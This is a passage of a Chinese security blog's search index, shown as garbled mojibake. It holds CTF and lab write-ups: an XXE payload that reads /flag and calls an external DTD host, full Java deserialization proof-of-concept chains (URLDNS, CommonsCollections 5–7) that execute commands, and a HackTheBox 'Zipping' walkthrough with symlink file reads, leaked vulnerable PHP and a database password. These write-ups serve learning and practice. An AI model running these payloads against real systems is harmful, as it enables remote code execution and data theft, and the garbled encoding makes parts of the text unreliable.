&quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;root&gt;1&lt;/root&gt;'''r = requests.post(url=url,data=data.encode('utf-16')) web378 å°è¯•å¼±å¯†ç ç™»é™†ï¼Œæ˜¾ç¤ºç™»é™†æˆåŠŸå´æ²¡æœ‰ååº”ï¼Œç”¨bpæŠ“åŒ…,å¾ˆæ˜æ˜¾æ˜¯xmlæ•°æ® 1&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; payload: 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt; &lt;username&gt; &amp;xxe; &lt;/username&gt; &lt;password&gt; admin &lt;/password&gt;&lt;/user&gt; é˜²èŒƒXXE ç¦ç”¨ XML è§£æå™¨ä¸­çš„å¤–éƒ¨å®ä½“å¤„ç† éªŒè¯ä¼ å…¥çš„ XML æ•°æ®ï¼Œä»¥ç¡®ä¿å…¶ä»…åŒ…å«å…è®¸çš„å®ä½“ ä½¿ç”¨å®‰å…¨çš„åº“å’Œ API å¤„ç† XML æ•°æ® å®æ–½é€‚å½“çš„è¾“å…¥éªŒè¯ï¼Œé˜²æ­¢æ¶æ„çš„ XML è¾“å…¥","link":"/2023/11/09/XXE/"},{"title":"URLDNS+CC5-7","text":"URLDNS1234567public static void main(String[] args) throws MalformedURLException { URL url = new URL(&quot;http://xop5snlkf29k57aea92nm4uei5owcm0b.oastify.com&quot;); HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;(); hashMap.put(url,1);} å¦‚æœè¿™æ ·æ‰§è¡Œçš„è¯ï¼Œå°±ä¼šå¯¹urlå‘èµ·DNSè§£æï¼Œ å¯ä»¥è°ƒè¯•çœ‹çœ‹ï¼š é¦–å…ˆè°ƒç”¨HashMapçš„putæ–¹æ³•ã€‚ 123public V put(K key, V value) { return putVal(hash(key), key, value, false, true);} ä¼šé€šè¿‡hashå‡½æ•°è°ƒç”¨key.hashCode()è®¡ç®—keyçš„hashCode; 1234static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);} keyæ˜¯ä¼ å…¥çš„URLå¯¹è±¡ï¼Œæœ€ç»ˆè°ƒç”¨URLå¯¹è±¡çš„hashCodeå‡½æ•°ï¼Œ 1234567public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;} handleræ˜¯URLStreamHandlerçš„å¯¹è±¡ï¼›handleråœ¨æ„é€ å‡½æ•°æ—¶è¢«èµ‹å€¼äº† 1transient URLStreamHandler handler æ¥ç€è°ƒç”¨äº†URLStreamHandler.hashCodeä¸­çš„getHostAddress(u)æ–¹æ³•å¯¼è‡´DNSè§£æ poc 123456789101112131415161718192021222324252627282930313233343536package demo1;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Test5 { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //ä¸ºäº†é˜²æ­¢åœ¨putæ—¶å°±å‘èµ·DNSè¯·æ±‚ï¼Œå°†hashCodeçš„é»˜è®¤å€¼-1æ”¹æ‰ï¼Œæ‰§è¡Œä¸äº†handler.hashCode(this) hashmap.put(url, 1); hashcodefield.set(url,-1); serialize(hashmap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections6å‰éƒ¨åˆ†å’ŒURLDNSä¸€æ ·ï¼ŒååŠéƒ¨åˆ†å’ŒCC1ä¸€æ ·ï¼Œä¸­é—´è¯¥ç”¨äº†TiedMapEntry å¯ä»¥çœ‹çœ‹TiedMapEntryç±»ä¸€éƒ¨åˆ†ä»£ç  123456789101112131415161718192021public class TiedMapEntry implements Map.Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } public Object getValue() { return map.get(key); } public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } hashCodeè°ƒç”¨äº†getValue();å…¶ä¸­getValueè°ƒç”¨äº†getæ–¹æ³•ï¼Œå¹¶ä¸”mapæ˜¯å¯æ§çš„ï¼Œ Gadget chain: 12345678910111213141516 ObjectInputStream.readObject()HashMap.readObject() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() ä»CC1çš„åŸºç¡€ä¸Šå°±åŠ äº†ä¸¤è¡Œä»£ç  12345678910111213Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;deadbeef&quot;);hashMap.put(tiedMapEntry,&quot;deadbeef&quot;); å’ŒURLDNSä¸€æ ·çš„ç‰¹ç‚¹(åˆæœ‰å·®å¼‚)ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯URLDNSé“¾åœ¨åºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤åï¼Œå¦‚æœä¸åšä¿®æ”¹ï¼›ååºåˆ—åŒ–å°±ä¸ä¼šæ‰§è¡Œäº† ä½†æ˜¯CC6ä¸ä¸€æ ·ï¼Œä»–æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–éƒ½ä¼šæ‰§è¡Œå‘½ä»¤ï¼›æ‰€ä»¥æ„Ÿè§‰å°±æ˜¯ä¸åšä¿®æ”¹ä¹Ÿæ— ä¼¤å¤§é›… å¦‚æœè¦ä½¿å¾—åºåˆ—åŒ–æ—¶ä¸è°ƒç”¨çš„è¯ï¼Œå’ŒURLDNSç±»ä¼¼çš„ä¿®æ”¹å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test5 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer); //å…¶å®ä¿®æ”¹LazyMapä¹Ÿå¯ä»¥ï¼›ä½†æ˜¯ä¿®æ”¹TiedMapEntryç®€å•ç‚¹ï¼Œ TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, &quot;deadbeef&quot;); hashMap.put(tiedMapEntry,&quot;deadbeef&quot;); Class tiedMapEntryClass = TiedMapEntry.class; Field map = tiedMapEntryClass.getDeclaredField(&quot;map&quot;); map.setAccessible(true); map.set(tiedMapEntry,lazyMap); serialize(hashMap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections5å’ŒCC6å·®ä¸å¤šï¼Œåªæ˜¯å…¥å£é“¾ä¸ä¸€æ · CC6æ˜¯åˆ©ç”¨TiedMapEntryä¸­çš„hashCodeå‡½æ•°ï¼›CC5æ˜¯åˆ©ç”¨TiedMapEntryä¸­çš„toStringå‡½æ•°;ä¸ºä»€ä¹ˆè¿˜å¯ä»¥åˆ©ç”¨toStringæ–¹æ³•ï¼›å…¶å®ä¹Ÿå°±æ˜¯å› ä¸ºtoStringä¹Ÿè°ƒç”¨äº†è°ƒç”¨äº†getValueæ–¹æ³•çš„åŸå›  1234567public String toString() { return getKey() + &quot;=&quot; + getValue();}public Object getValue() { return map.get(key);} BadAttributeValueExpExceptionè¿™ä¸ªç±»çš„readObjectè°ƒç”¨valObj.toString(),valObjçš„å€¼æ˜¯å¯æ§çš„ï¼›å°½ç®¡BadAttributeValueExpExceptionæ²¡æœ‰å®ç° Serializable æ¥å£çš„æƒ…å†µä¸‹,ä»»ç„¶å¯ä»¥åºåˆ—åŒ– GPT:BadAttributeValueExpExceptionç±»å¯èƒ½ä½¿ç”¨äº†ä¸€ç§ç‰¹æ®Šçš„åºåˆ—åŒ–æ–¹å¼ï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨æ²¡æœ‰å®ç° Serializable æ¥å£çš„æƒ…å†µä¸‹è¢«åºåˆ—åŒ–ã€‚ä¸€äº›æ ‡å‡†çš„å¼‚å¸¸ç±»ï¼Œå¦‚ RuntimeException çš„å­ç±»ï¼Œæœ‰æ—¶ä¼šè¢«è®¾è®¡æˆå¯åºåˆ—åŒ–çš„ï¼Œå³ä½¿å®ƒä»¬æ²¡æœ‰æ˜¾å¼åœ°å®ç° Serializable æ¥å£ã€‚ 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); }} Gadget chain: 123456789101112131415ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test9 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;deadbeef&quot;); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Class bclass = badAttributeValueExpException.getClass(); Field val = bclass.getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(badAttributeValueExpException,tiedMapEntry); serialize(badAttributeValueExpException); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections7123456789101112131415 ObjectInputStream.readObject()HashMap.readObject() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() CC7è¿™æ¡é“¾å‰åŠéƒ¨åˆ†æœ‰ç‚¹ç»•ï¼› å…ˆåˆ©ç”¨HashMapä¸­putValæ–¹æ³•ï¼Œé€šè¿‡å“ˆå¸Œç¢°æ’(å…¶å®å°±æ˜¯ä¸¤ä¸ªèŠ‚ç‚¹æ”¾åœ¨äº†æ•°ç»„ä¸­çš„åŒä¸€ä¸ªä½ç½®ï¼ŒHashMapæœ¬æ¥å°±æ˜¯æ•°ç»„+åˆ—è¡¨çš„å½¢å¼)ï¼› ç„¶åä¼šè°ƒç”¨key.equals(k);è¦æ·»åŠ çš„keyå¯¹è±¡çš„equalsæ–¹æ³•ï¼Œkæ˜¯æ•°ç»„ä¸­å·²å­˜åœ¨çš„å¯¹è±¡ï¼› 1234567891011final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else { Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) // &lt;-- CC7æ˜¯å°†keyçš„å€¼ä¸ºä¸€ä¸ªLazymapå¯¹è±¡ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Lazymap.equalsï¼Œä½†æ˜¯Lazymapæ²¡æœ‰equalsæ–¹æ³•ï¼Œæ‰€ä»¥æ‰¾åˆ°äº†lazymapçš„çˆ¶ç±»AbstractMapDecorator; 123456public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); // &lt;--} mapçš„å€¼ä¸ºå½“å‰è°ƒç”¨putæ–¹æ³•çš„HashMap,ç„¶åå°±ä¼šè°ƒç”¨HashMapçš„equalsæ–¹æ³•;ä½†æ˜¯HashMapæ²¡æœ‰equalsæ–¹æ³•ï¼Œæ‰€ä»¥æ‰¾åˆ°äº†HashMapçš„çˆ¶ç±»AbstractMap;(ä¸€å¼€å§‹æ²¡æå¤ªæ‡‚mapæ˜¯ä»€ä¹ˆæ—¶å€™è¢«èµ‹å€¼ä¸ºå½“å‰è°ƒç”¨putæ–¹æ³•çš„HashMapçš„ï¼Œè°ƒè¯•åå‘ç°æ˜¯é€šè¿‡LazyMapçš„æ„é€ å‡½æ•°super(map);) æ³¨æ„ï¼šåœ¨AbstractMap.equalsæ–¹æ³•ä¸­ï¼Œå°†å¯¹è±¡o(ä¹Ÿå°±æ˜¯Hashmapæ•°ç»„ä¸­å·²ç»å­˜åœ¨çš„Hashmapå¯¹è±¡ï¼Œå¹¶ä¸æ˜¯å½“å‰è°ƒç”¨putæ–¹æ³•çš„Hashmapå¯¹è±¡)èµ‹å€¼ç»™äº†m;ç„¶åè°ƒç”¨m.get(key),å¦‚æœå¯¹è±¡oæ˜¯ä¸€ä¸ªæ¶æ„çš„Lazymapå¯¹è±¡ï¼Œå°±ä¼šè°ƒç”¨Lazymap.get 12345678910111213141516171819202122public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try { Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) { Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key)))// &lt;-- å¯¹äºæˆ‘ä»¬çš„ exp æ¥è¯´, ä¼šåœ¨è¿™é‡Œä¼šè§¦å‘ ...... poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test10 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // &quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode() == 3872 HashMap&lt;String, String&gt; hashMap1 = new HashMap&lt;&gt;(); HashMap&lt;String, String&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap1.put(&quot;yy&quot;,&quot;1&quot;); hashMap2.put(&quot;zZ&quot;,&quot;1&quot;); Map lazyMap1 = LazyMap.decorate(hashMap1, new ConstantTransformer(1)); Map lazyMap2 = LazyMap.decorate(hashMap2,new ConstantTransformer(1));// System.out.println(lazyMap1.hashCode());// System.out.println(lazyMap2.hashCode()); HashMap&lt;Object, Object&gt; hashMap3 = new HashMap&lt;&gt;(); hashMap3.put(lazyMap1,&quot;deadbeef&quot;); hashMap3.put(lazyMap2,&quot;deadbeef&quot;); // LazyMap.getæ–¹æ³•ä¸­ä¼šå°†ç»“æœå­˜å…¥ hashMap1 ä¸­, æ‰€ä»¥è¿™é‡Œéœ€è¦å°†å…¶æ¸…é™¤, å¦åˆ™ hashcode å°±ä¸ä¸€æ ·äº† hashMap1.remove(&quot;zZ&quot;); //é˜²æ­¢åœ¨åºåˆ—åŒ–æ—¶å°±æ‰§è¡Œå‘½ä»¤ Class lclass = lazyMap1.getClass(); Field factory = lclass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap1,chainedTransformer); serialize(hashMap3); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }}","link":"/2024/02/29/URLDNS+CC5-7/"},{"title":"Zipping(HTB)","text":"ä¿¡æ¯æœé›†nmap12345sudo nmap -p- -sT -min-rate 3000 10.10.11.229PORT STATE SERVICE22/tcp open ssh80/tcp open http dirsearch1234dirsearch -u http://10.10.11.229/ [09:38:37] 301 - 311B - /shop -&gt; http://10.10.11.229/shop/ [09:38:46] 200 - 5KB - /upload.php æ–‡ä»¶åŒ…å« /shopå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´(åªèƒ½åŒ…å«php)ï¼ŒçŒœæµ‹æºç æ˜¯$page.&quot;php&quot;ä¹‹ç±»çš„ ä»»æ„æ–‡ä»¶è¯»å– /upload.phpå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼›ä¸Šä¼ å•ä¸ªä»¥pdfä¸ºåç¼€å‹ç¼©çš„zipæ–‡ä»¶ï¼›å¯ä»¥ç”¨è½¯è¿æ¥è¯»å–ä»»æ„æ–‡ä»¶ï¼› 123456ln -s /etc/passwd pass.pdfls -l pass.pdflrwxrwxrwx 1 kali kali 11 12æœˆ13æ—¥ 09:52 pass.pdf -&gt; /etc/passwdzip --symlinks pass.zip pass.pdf zipå‘½ä»¤ä¸­çš„--symlinksé€‰é¡¹ç”¨äºæŒ‡ç¤ºzipå‘½ä»¤åœ¨åˆ›å»ºå­˜æ¡£æ—¶å¦‚ä½•å¤„ç†ç¬¦å·é“¾æ¥ã€‚å¦‚æœä½¿ç”¨äº†â€“symlinksé€‰é¡¹ï¼Œzipå‘½ä»¤å°†ä¼šå­˜å‚¨ç¬¦å·é“¾æ¥æœ¬èº«ï¼Œè€Œä¸æ˜¯ç¬¦å·é“¾æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ã€‚è¿™æ„å‘³ç€è§£å‹ç¼©å­˜æ¡£åï¼Œç¬¦å·é“¾æ¥å°†ä¼šä¿ç•™å…¶é“¾æ¥å…³ç³»ï¼Œè€Œä¸æ˜¯è¢«è§£å‹æˆå®é™…çš„æ–‡ä»¶ã€‚ ä¸Šä¼ pass.zipæ–‡ä»¶ï¼Œç”¨bpæŠ“åŒ…å°±å¯ä»¥è¯»å–åˆ°/etc/passwdï¼›ä¾æ¬¡è¯»å–shop/index.php,/shop/cat.phpç­‰æ–‡ä»¶ 1234567891011#/var/www/html/shop/index.php&lt;?phpsession_start();// Include functions and connect to the database using PDO MySQLinclude 'functions.php';$pdo = pdo_connect_mysql();// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.$page = isset($_GET['page']) &amp;&amp; file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';// Include and show the requested pageinclude $page . '.php';?&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#/var/www/html/shop/cat.php&lt;?php// If the user clicked the add to cart button on the product page we can check for the form dataif (isset($_POST['product_id'], $_POST['quantity'])) { // Set the post variables so we easily identify them, also make sure they are integer $product_id = $_POST['product_id']; $quantity = $_POST['quantity']; // Filtering user input for letters or special characters if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) { echo ''; } else { // Construct the SQL statement with a vulnerable parameter $sql = &quot;SELECT * FROM products WHERE id = '&quot; . $_POST['product_id'] . &quot;'&quot;; // Execute the SQL statement without any sanitization or parameter binding $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC); // Check if the product exists (array is not empty) if ($product &amp;&amp; $quantity &gt; 0) { // Product exists in database, now we can create/update the session variable for the cart if (isset($_SESSION['cart']) &amp;&amp; is_array($_SESSION['cart'])) { if (array_key_exists($product_id, $_SESSION['cart'])) { // Product exists in cart so just update the quanity $_SESSION['cart'][$product_id] += $quantity; } else { // Product is not in cart so add it $_SESSION['cart'][$product_id] = $quantity; } } else { // There are no products in cart, this will add the first product to cart $_SESSION['cart'] = array($product_id =&gt; $quantity); } } // Prevent form resubmission... header('location: index.php?page=cart'); exit; }}// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it's a number and check if it's in the cartif (isset($_GET['remove']) &amp;&amp; is_numeric($_GET['remove']) &amp;&amp; isset($_SESSION['cart']) &amp;&amp; isset($_SESSION['cart'][$_GET['remove']])) { // Remove the product from the shopping cart unset($_SESSION['cart'][$_GET['remove']]);}// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart pageif (isset($_POST['update']) &amp;&amp; isset($_SESSION['cart'])) { // Loop through the post data so we can update the quantities for every product in cart foreach ($_POST as $k =&gt; $v) { if (strpos($k, 'quantity') !== false &amp;&amp; is_numeric($v)) { $id = str_replace('quantity-', '', $k); $quantity = (int)$v; // Always do checks and validation if (is_numeric($id) &amp;&amp; isset($_SESSION['cart'][$id]) &amp;&amp; $quantity &gt; 0) { // Update new quantity $_SESSION['cart'][$id] = $quantity; } } } // Prevent form resubmission... header('location: index.php?page=cart'); exit;}// Send the user to the place order page if they click the Place Order button, also the cart should not be emptyif (isset($_POST['placeorder']) &amp;&amp; isset($_SESSION['cart']) &amp;&amp; !empty($_SESSION['cart'])) { header('Location: index.php?page=placeorder'); exit;}if (isset($_POST['clear'])) { unset($_SESSION['cart']);}// Check the session variable for products in cart$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();$products = array();$subtotal = 0.00;// If there are products in cartif ($products_in_cart) { // There are products in the cart so we need to select those products from the database // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc) $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?')); $stmt = $pdo-&gt;prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')'); // We only need the array keys, not the values, the keys are the id's of the products $stmt-&gt;execute(array_keys($products_in_cart)); // Fetch the products from the database and return the result as an Array $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC); // Calculate the subtotal foreach ($products as $product) { $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']]; }}?&gt; 1234567891011121314151617##/var/www/html/shop/products.php&lt;?php// The amounts of products to show on each page$num_products_on_each_page = 4;// The current page - in the URL, will appear as index.php?page=products&amp;p=1, index.php?page=products&amp;p=2, etc...$current_page = isset($_GET['p']) &amp;&amp; is_numeric($_GET['p']) ? (int)$_GET['p'] : 1;// Select products ordered by the date added$stmt = $pdo-&gt;prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT ?,?');// bindValue will allow us to use an integer in the SQL statement, which we need to use for the LIMIT clause$stmt-&gt;bindValue(1, ($current_page - 1) * $num_products_on_each_page, PDO::PARAM_INT);$stmt-&gt;bindValue(2, $num_products_on_each_page, PDO::PARAM_INT);$stmt-&gt;execute();// Fetch the products from the database and return the result as an Array$products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);// Get the total number of products$total_products = $pdo-&gt;query('SELECT * FROM products')-&gt;rowCount();?&gt; 12345678910111213141516171819#/var/www/html/functions.php&lt;?phpfunction pdo_connect_mysql() { // Update the details below with your MySQL details $DATABASE_HOST = 'localhost'; $DATABASE_USER = 'root'; $DATABASE_PASS = 'MySQL_P@ssw0rd!'; $DATABASE_NAME = 'zipping'; try { return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS); } catch (PDOException $exception) { // If there is an error with the connection, stop the script and display the error. exit('Failed to connect to database!'); }}// Template header, feel free to customize thisfunction template_header($title) {$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;?&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041#/var/www/html/upload.php &lt;?php if(isset($_POST['submit'])) { // Get the uploaded zip file $zipFile = $_FILES['zipFile']['tmp_name']; if ($_FILES[&quot;zipFile&quot;][&quot;size&quot;] &gt; 300000) { echo &quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;; } else { // Create an md5 hash of the zip file $fileHash = md5_file($zipFile); // Create a new directory for the extracted files $uploadDir = &quot;uploads/$fileHash/&quot;; $tmpDir = sys_get_temp_dir(); // Extract the files from the zip $zip = new ZipArchive; if ($zip-&gt;open($zipFile) === true) { if ($zip-&gt;count() &gt; 1) { echo '&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;'; } else { // Get the name of the compressed file $fileName = $zip-&gt;getNameIndex(0); if (pathinfo($fileName, PATHINFO_EXTENSION) === &quot;pdf&quot;) { $uploadPath = $tmpDir.'/'.$uploadDir; echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '&gt;/dev/null'); if (file_exists($uploadPath.$fileName)) { mkdir($uploadDir); rename($uploadPath.$fileName, $uploadDir.$fileName); } echo '&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;'.$uploadDir.$fileName.'&quot;&gt;'.$uploadDir.$fileName.'&lt;/a&gt;'.'&lt;/p&gt;'; } else { echo &quot;&lt;p&gt;The unzipped file must have a .pdf 